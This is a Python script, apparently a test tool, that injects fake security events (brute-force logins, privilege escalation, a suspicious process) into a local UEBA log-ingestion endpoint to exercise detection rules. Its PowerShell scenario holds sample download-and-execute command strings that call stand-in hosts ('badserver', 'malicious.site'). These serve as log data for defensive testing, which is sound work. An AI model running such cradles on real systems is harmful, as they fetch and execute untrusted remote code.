#!/usr/bin/env python3
import argparse
import requests
import random
import time
from datetime import datetime, timezone

URL = "http://localhost:2021/log/ingest"
USERS = ["jsmith", "admin", "analyst", "guest", "baduser"]
HOSTS = ["host01", "host02", "host03"]

def inject(payload, label):
    resp = requests.post(URL, json=payload)
    if resp.ok:
        print(f"{label}: OK")
    else:
        print(f"{label}: ERREUR ({resp.status_code}) {resp.text}")

def scenario_bruteforce(count):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    for i in range(count):
        entry = [{
            "timestamp": now,
            "log": "failed to log on"
        }]
        inject(entry, f"BruteForce {i+1}")
        time.sleep(0.5)

def scenario_powershell_suspicious(count):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    ps_commands = [
        "Invoke-WebRequest -Uri http://badserver/script.ps1",
        "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious.site')"
    ]
    for i in range(count):
        entry = [{
            "timestamp": now,
            "ps_command": random.choice(ps_commands),
            "user": random.choice(USERS),
            "host": random.choice(HOSTS),
            "tags": "mitre_powershell"
        }]
        inject(entry, f"PowerShellSuspicious {i+1}")
        time.sleep(0.5)

def scenario_privilege_escalation(count):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    for i in range(count):
        entry = [{
            "timestamp": now,
            "tags": "mitre_privilege_escalation",
            "user": random.choice(USERS),
            "command": "runas /user:administrator cmd"
        }]
        inject(entry, f"PrivilegeEscalation {i+1}")
        time.sleep(0.5)

def scenario_process_suspect(count):
    now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    for i in range(count):
        entry = [{
            "timestamp": now,
            "tags": "mitre_process_suspect",
            "user": random.choice(USERS),
            "new_process": "malware.exe",
            "command": "C:\\malware\\malware.exe"
        }]
        inject(entry, f"ProcessSuspect {i+1}")
        time.sleep(0.5)

def main():
    parser = argparse.ArgumentParser(description="Injecteur de logs de test UEBA")
    parser.add_argument('--bruteforce', type=int, default=0, help='Nombre de logs brute force à injecter')
    parser.add_argument('--powershell', type=int, default=0, help='Nombre de logs PowerShell suspects à injecter')
    parser.add_argument('--privilege', type=int, default=0, help='Nombre de logs Privilege Escalation à injecter')
    parser.add_argument('--process', type=int, default=0, help='Nombre de logs Process suspect à injecter')
    args = parser.parse_args()

    if args.bruteforce:
        scenario_bruteforce(args.bruteforce)
    if args.powershell:
        scenario_powershell_suspicious(args.powershell)
    if args.privilege:
        scenario_privilege_escalation(args.privilege)
    if args.process:
        scenario_process_suspect(args.process)
    if not (args.bruteforce or args.powershell or args.privilege or args.process):
        print("Aucun scénario sélectionné, voir --help")

if __name__ == "__main__":
    main()
